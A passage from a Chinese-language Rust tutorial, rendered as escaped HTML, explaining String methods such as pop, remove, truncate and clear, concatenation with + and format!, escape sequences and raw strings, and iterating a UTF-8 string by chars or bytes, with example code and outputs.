类型，如果字符串为空，则返回  <code>None</code> 。</p>\n<p>示例代码如下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> string_pop <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rust pop 中文!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">let</span> p1 <span class=\"token operator\">=</span> string_pop<span class=\"token punctuation\">.</span><span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">let</span> p2 <span class=\"token operator\">=</span> string_pop<span class=\"token punctuation\">.</span><span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token macro property\">dbg!</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token macro property\">dbg!</span><span class=\"token punctuation\">(</span>p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token macro property\">dbg!</span><span class=\"token punctuation\">(</span>string_pop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>代码运行结果：</p>\n<pre><code class=\"language-console\">p1 = Some(\n   '!',\n)\np2 = Some(\n   '文',\n)\nstring_pop = &quot;rust pop 中&quot;\n</code></pre>\n<p>2、  <code>remove</code>  —— 删除并返回字符串中指定位置的字符</p>\n<p><strong>该方法是直接操作原来的字符串</strong>。但是存在返回值，其返回值是删除位置的字符串，只接收一个参数，表示该字符起始索引位置。 <code>remove()</code>  方法是按照字节来处理字符串的，如果参数所给的位置不是合法的字符边界，则会发生错误。</p>\n<p>示例代码如下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> string_remove <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"测试remove方法\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token string\">\"string_remove 占 &#123;&#125; 个字节\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>mem<span class=\"token punctuation\">::</span></span><span class=\"token function\">size_of_val</span><span class=\"token punctuation\">(</span>string_remove<span class=\"token punctuation\">.</span><span class=\"token function\">as_str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 删除第一个汉字</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    string_remove<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 下面代码会发生错误</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// string_remove.remove(1);</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// 直接删除第二个汉字</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// string_remove.remove(3);</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token macro property\">dbg!</span><span class=\"token punctuation\">(</span>string_remove<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>代码运行结果：</p>\n<pre><code class=\"language-console\">string_remove 占 18 个字节\nstring_remove = &quot;试remove方法&quot;\n</code></pre>\n<p>3、 <code>truncate</code>  —— 删除字符串中从指定位置开始到结尾的全部字符</p>\n<p><strong>该方法是直接操作原来的字符串</strong>。无返回值。该方法  <code>truncate()</code>  方法是按照字节来处理字符串的，如果参数所给的位置不是合法的字符边界，则会发生错误。</p>\n<p>示例代码如下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> string_truncate <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"测试truncate\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    string_truncate<span class=\"token punctuation\">.</span><span class=\"token function\">truncate</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token macro property\">dbg!</span><span class=\"token punctuation\">(</span>string_truncate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>代码运行结果：</p>\n<pre><code class=\"language-console\">string_truncate = &quot;测&quot;\n</code></pre>\n<p>4、 <code>clear</code>  —— 清空字符串</p>\n<p><strong>该方法是直接操作原来的字符串</strong>。调用后，删除字符串中的所有字符，相当于  <code>truncate()</code>  方法参数为 0 的时候。</p>\n<p>示例代码如下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> string_clear <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"string clear\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    string_clear<span class=\"token punctuation\">.</span><span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token macro property\">dbg!</span><span class=\"token punctuation\">(</span>string_clear<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>代码运行结果：</p>\n<pre><code class=\"language-console\">string_clear = &quot;&quot;\n</code></pre>\n<h4 id=\"连接-concatenate\"><a class=\"anchor\" href=\"#连接-concatenate\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTglQkYlOUUlRTYlOEUlQTUtY29uY2F0ZW5hdGU=\">连接 (Concatenate)</span></h4>\n<p>1、使用  <code>+</code>  或者  <code>+=</code>  连接字符串</p>\n<p>使用  <code>+</code>  或者  <code>+=</code>  连接字符串，要求右边的参数必须为字符串的切片引用（Slice）类型。其实当调用  <code>+</code>  的操作符时，相当于调用了  <code>std::string</code>  标准库中的 <a href=\"https://doc.rust-lang.org/std/string/struct.String.html#method.add\"> <code>add()</code> </a> 方法，这里  <code>add()</code>  方法的第二个参数是一个引用的类型。因此我们在使用  <code>+</code>  时， 必须传递切片引用类型。不能直接传递  <code>String</code>  类型。<strong> <code>+</code>  是返回一个新的字符串，所以变量声明可以不需要  <code>mut</code>  关键字修饰</strong>。</p>\n<p>示例代码如下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> string_append <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">let</span> string_rust <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rust\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// &amp;string_rust 会自动解引用为 & amp;str</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">let</span> result <span class=\"token operator\">=</span> string_append <span class=\"token operator\">+</span> <span class=\"token operator\">&amp;</span>string_rust<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> result <span class=\"token operator\">=</span> result <span class=\"token operator\">+</span> <span class=\"token string\">\"!\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// `result +\"!\"`中的`result` 是不可变的</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    result <span class=\"token operator\">+=</span> <span class=\"token string\">\"!!!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"连接字符串 + -> &#123;&#125;\"</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>代码运行结果：</p>\n<pre><code class=\"language-console\">连接字符串 + -&gt; hello rust!!!!\n</code></pre>\n<p><code>add()</code>  方法的定义：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">str</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">String</span></pre></td></tr></table></figure><p>因为该方法涉及到更复杂的特征功能，因此我们这里简单说明下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> s1 <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello,\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">let</span> s2 <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"world!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// 在下句中，s1 的所有权被转移走了，因此后面不能再使用 s1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">let</span> s3 <span class=\"token operator\">=</span> s1 <span class=\"token operator\">+</span> <span class=\"token operator\">&amp;</span>s2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token macro property\">assert_eq!</span><span class=\"token punctuation\">(</span>s3<span class=\"token punctuation\">,</span><span class=\"token string\">\"hello,world!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 下面的语句如果去掉注释，就会报错</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// println!(\"&#123;&#125;\",s1);</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>self</code>  是  <code>String</code>  类型的字符串  <code>s1</code> ，该函数说明，只能将  <code>&amp;str</code>  类型的字符串切片添加到  <code>String</code>  类型的  <code>s1</code>  上，然后返回一个新的  <code>String</code>  类型，所以  <code>let s3 = s1 + &amp;s2;</code>  就很好解释了，将  <code>String</code>  类型的  <code>s1</code>  与  <code>&amp;str</code>  类型的  <code>s2</code>  进行相加，最终得到  <code>String</code>  类型的  <code>s3</code> 。</p>\n<p>由此可推，以下代码也是合法的：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> s1 <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tic\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">let</span> s2 <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tac\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">let</span> s3 <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"toe\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// String = String + &amp;str + &amp;str + &amp;str + &amp;str</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span> s1 <span class=\"token operator\">+</span> <span class=\"token string\">\"-\"</span> <span class=\"token operator\">+</span> <span class=\"token operator\">&amp;</span>s2 <span class=\"token operator\">+</span> <span class=\"token string\">\"-\"</span> <span class=\"token operator\">+</span> <span class=\"token operator\">&amp;</span>s3<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>String + &amp;str</code>  返回一个  <code>String</code> ，然后再继续跟一个  <code>&amp;str</code>  进行  <code>+</code>  操作，返回一个  <code>String</code>  类型，不断循环，最终生成一个  <code>s</code> ，也是  <code>String</code>  类型。</p>\n<p><code>s1</code>  这个变量通过调用  <code>add()</code>  方法后，所有权被转移到  <code>add()</code>  方法里面，  <code>add()</code>  方法调用后就被释放了，同时  <code>s1</code>  也被释放了。再使用  <code>s1</code>  就会发生错误。这里涉及到<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvb3duZXJzaGlwL293bmVyc2hpcC5odG1sIyVFOCVCRCVBQyVFNyVBNyVCQiVFNiU4OSU4MCVFNiU5QyU4OSVFNiU5RCU4Mw==\">所有权转移（Move）</span>的相关知识。</p>\n<p>2、使用  <code>format!</code>  连接字符串</p>\n<p><code>format!</code>  这种方式适用于  <code>String</code>  和  <code>&amp;str</code>  。 <code>format!</code>  的用法与  <code>print!</code>  的用法类似，详见<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvZm9ybWF0dGVkLW91dHB1dC5odG1sI3ByaW50cHJpbnRsbmZvcm1hdA==\">格式化输出</span>。</p>\n<p>示例代码如下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> s1 <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">let</span> s2 <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rust\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span> <span class=\"token macro property\">format!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125; &#123;&#125;!\"</span><span class=\"token punctuation\">,</span> s1<span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>代码运行结果：</p>\n<pre><code class=\"language-console\">hello rust!\n</code></pre>\n<h3 id=\"字符串转义\"><a class=\"anchor\" href=\"#字符串转义\">#</a> 字符串转义：</h3>\n<p>我们可以通过转义的方式  <code>\\</code>  输出 ASCII 和 Unicode 字符。</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\">// 通过 \\ + 字符的十六进制表示，转义输出一个字符</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">let</span> byte_escape <span class=\"token operator\">=</span> <span class=\"token string\">\"I'm writing \\x52\\x75\\x73\\x74!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What are you doing\\x3F (\\\\x3F means ?) &#123;&#125;\"</span><span class=\"token punctuation\">,</span> byte_escape<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// \\u 可以输出一个 unicode 字符</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">let</span> unicode_codepoint <span class=\"token operator\">=</span> <span class=\"token string\">\"\\u&#123;211D&#125;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">let</span> character_name <span class=\"token operator\">=</span> <span class=\"token string\">\"\\\"DOUBLE-STRUCK CAPITAL R\\\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token string\">\"Unicode character &#123;&#125; (U+211D) is called &#123;&#125;\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        unicode_codepoint<span class=\"token punctuation\">,</span> character_name</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token comment\">// 换行了也会保持之前的字符串格式</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">// 使用 \\ 忽略换行符</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">let</span> long_string <span class=\"token operator\">=</span> <span class=\"token string\">\"String literals</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                        can span multiple lines.</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                        The linebreak and indentation here ->\\</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                        &lt;- can be escaped too!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> long_string<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在 \\ 加上一个 \\ 转义这个就好了</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hello \\\\x52\\\\x75\\\\x73\\\\x74\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">let</span> raw_str <span class=\"token operator\">=</span> <span class=\"token string\">r\"Escapes don't work here: \\x3F \\u&#123;211D&#125;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> raw_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// 如果字符串包含双引号，可以在开头和结尾加 #</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">let</span> quotes <span class=\"token operator\">=</span> <span class=\"token string\">r#\"And then I said: \"There is no escape!\"\"#</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> quotes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// 如果字符串中包含 # 号，可以在开头和结尾加多个 # 号，最多加 255 个，只需保证与字符串中连续 # 号的个数不超过开头和结尾的 # 号的个数即可</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">let</span> longer_delimiter <span class=\"token operator\">=</span> <span class=\"token string\">r###\"A string with \"# in it. And even \"##!\"###</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> longer_delimiter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>操作 UTF-8 字符串</p>\n<p>前文提到了几种使用 UTF-8 字符串的方式，下面来一一说明。</p>\n<h4 id=\"字符\"><a class=\"anchor\" href=\"#字符\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTUlQUQlOTclRTclQUMlQTY=\">字符</span></h4>\n<p>如果你想要以 Unicode 字符的方式遍历字符串，最好的办法是使用  <code>chars</code>  方法，例如：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> <span class=\"token string\">\"中国人\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">chars</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>输出如下</p>\n<pre><code class=\"language-console\">中\n国\n人\n</code></pre>\n<h4 id=\"字节\"><a class=\"anchor\" href=\"#字节\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTUlQUQlOTclRTglOEElODI=\">字节</span></h4>\n<p>这种方式是返回字符串的底层字节数组表现形式：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> b <span class=\"token keyword\">in</span> <span class=\"token string\">\"中国人\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>输出如下：</p>\n<pre><code class=\"language-console\">228\n184\n173\n229\n155\n189\n228\n186\n186\n</code></pre>\n<h4 id=\"获取子串\"><a class=\"anchor\" href=\"#获取子串\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTglOEUlQjclRTUlOEYlOTYlRTUlQUQlOTAlRTQlQjglQjI=\">获取子串</span></h4>\n<p>想要准确的从 UTF-8 字符串中获取子串是较为复杂的事情，例如想要从  <code>holla中国人नमस्ते</code>  这种变长的字符串中取出某一个子串，使用标准库你是做不到的。 你需要在  <code>crates.io</code>  上搜索  <code>utf8</code>  来寻找想要的功能。</p>\n<p>可以考虑尝试下这个库：<span 